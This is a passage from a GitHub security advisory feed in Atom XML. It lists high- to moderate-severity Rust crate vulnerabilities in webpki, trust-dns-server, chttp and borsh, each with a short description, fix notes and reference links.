<li><a href="https://github.com/servo/rust-smallvec/commit/e64afc8c473d43e375ab42bd33db2d0d4ac4e41b">https://github.com/servo/rust-smallvec/commit/e64afc8c473d43e375ab42bd33db2d0d4ac4e41b</a></li>
<li><a href="https://github.com/advisories/GHSA-55m5-whcv-c49c">https://github.com/advisories/GHSA-55m5-whcv-c49c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-55m5-whcv-c49c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-01-06T22:20:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webpki] webpki: CPU denial of service in certificate path building]]></title>
        <id>https://github.com/advisories/GHSA-8qv2-5vq6-g2g7</id>
        <link href="https://github.com/advisories/GHSA-8qv2-5vq6-g2g7"/>
        <updated>2023-10-02T21:02:45.000Z</updated>
        <content type="html"><![CDATA[<p>When this crate is given a pathological certificate chain to validate, it will spend CPU time exponential with the number of candidate certificates at each step of path building.</p>
<p>Both TLS clients and TLS servers that accept client certificate are affected.</p>
<p>This was previously reported in <a href="https://github.com/briansmith/webpki/issues/69">https://github.com/briansmith/webpki/issues/69</a>.</p>
<p><code>rustls-webpki</code> is a fork of this crate which contains a fix for this issue and is actively maintained.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/crypto-com/sgx-vendor">https://github.com/crypto-com/sgx-vendor</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0052.html">https://rustsec.org/advisories/RUSTSEC-2023-0052.html</a></li>
<li><a href="https://github.com/briansmith/webpki/issues/69">https://github.com/briansmith/webpki/issues/69</a></li>
<li><a href="https://github.com/briansmith/webpki/issues/69#issuecomment-1699894848">https://github.com/briansmith/webpki/issues/69#issuecomment-1699894848</a></li>
<li><a href="https://github.com/briansmith/webpki/commit/30a108e0802fd09585e0d071013f24b8272d139b">https://github.com/briansmith/webpki/commit/30a108e0802fd09585e0d071013f24b8272d139b</a></li>
<li><a href="https://github.com/advisories/GHSA-8qv2-5vq6-g2g7">https://github.com/advisories/GHSA-8qv2-5vq6-g2g7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8qv2-5vq6-g2g7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-08-25T00:12:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[trust-dns-server] Stack consumption in trust-dns-server]]></title>
        <id>https://github.com/advisories/GHSA-4cww-f7w5-x525</id>
        <link href="https://github.com/advisories/GHSA-4cww-f7w5-x525"/>
        <updated>2023-10-02T20:26:29.000Z</updated>
        <content type="html"><![CDATA[<p>There's a stack overflow leading to a crash and potential DOS when processing additional records for return of MX or SRV record types from the server. This is only possible when a zone is configured with a null target for MX or SRV records. Prior to 0.16.0 the additional record processing was not supported by trust-dns-server. There Are no known issues with upgrading from 0.16 or 0.17 to 0.18.1. The remidy should be to upgrade to 0.18.1. If unable to do so, MX, SRV or other record types with a target to the null type, should be avoided.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-35857">https://nvd.nist.gov/vuln/detail/CVE-2020-35857</a></li>
<li><a href="https://github.com/bluejekyll/trust-dns/issues/980">https://github.com/bluejekyll/trust-dns/issues/980</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2020-0001.html">https://rustsec.org/advisories/RUSTSEC-2020-0001.html</a></li>
<li><a href="https://github.com/bluejekyll/trust-dns/pull/982">https://github.com/bluejekyll/trust-dns/pull/982</a></li>
<li><a href="https://github.com/bluejekyll/trust-dns/commit/8b9eab05795fdc098976262853b2498055c7a8f3">https://github.com/bluejekyll/trust-dns/commit/8b9eab05795fdc098976262853b2498055c7a8f3</a></li>
<li><a href="https://github.com/advisories/GHSA-4cww-f7w5-x525">https://github.com/advisories/GHSA-4cww-f7w5-x525</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4cww-f7w5-x525</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-08-25T20:46:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[chttp] Use-after-free in chttp]]></title>
        <id>https://github.com/advisories/GHSA-5rrv-m36h-qwf8</id>
        <link href="https://github.com/advisories/GHSA-5rrv-m36h-qwf8"/>
        <updated>2023-11-06T05:01:01.000Z</updated>
        <content type="html"><![CDATA[<p>The From implementation for Vec was not properly implemented, returning a vector backed by freed memory. This could lead to memory corruption or be exploited to cause undefined behavior.</p>
<p>A fix was published in version 0.1.3.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-16140">https://nvd.nist.gov/vuln/detail/CVE-2019-16140</a></li>
<li><a href="https://github.com/sagebind/isahc/issues/2">https://github.com/sagebind/isahc/issues/2</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2019-0016.html">https://rustsec.org/advisories/RUSTSEC-2019-0016.html</a></li>
<li><a href="https://github.com/sagebind/isahc/commit/9e9f1fb44114078c000c78c72e691eeb9e7ac260">https://github.com/sagebind/isahc/commit/9e9f1fb44114078c000c78c72e691eeb9e7ac260</a></li>
<li><a href="https://github.com/advisories/GHSA-5rrv-m36h-qwf8">https://github.com/advisories/GHSA-5rrv-m36h-qwf8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5rrv-m36h-qwf8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2021-08-25T20:44:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[borsh] Parsing borsh messages with ZST which are not-copy/clone is unsound]]></title>
        <id>https://github.com/advisories/GHSA-fjx5-qpf4-xjf2</id>
        <link href="https://github.com/advisories/GHSA-fjx5-qpf4-xjf2"/>
        <updated>2023-09-29T18:12:12.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of borsh cause undefined behavior when zero-sized-types (ZST) are parsed and the Copy/Clone traits are not implemented/derived. For instance if 1000 instances of a ZST are deserialized, and the ZST is not copy (this can be achieved through a singleton), then accessing/writing to deserialized data will cause a segmentation fault.</p>
<p>There is currently no way for borsh to read data without also providing a Rust type. Therefore, if you are not using ZST for serialization, then you are not affected by this issue. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/near/borsh-rs/issues/19">https://github.com/near/borsh-rs/issues/19</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0033.html">https://rustsec.org/advisories/RUSTSEC-2023-0033.html</a></li>
<li><a href="https://github.com/advisories/GHSA-fjx5-qpf4-xjf2">https://github.com/advisories/GHSA-fjx5-qpf4-xjf2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fjx5-qpf4-xjf2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-04-17T16:32:26.000Z</published>
    </entry>
</feed>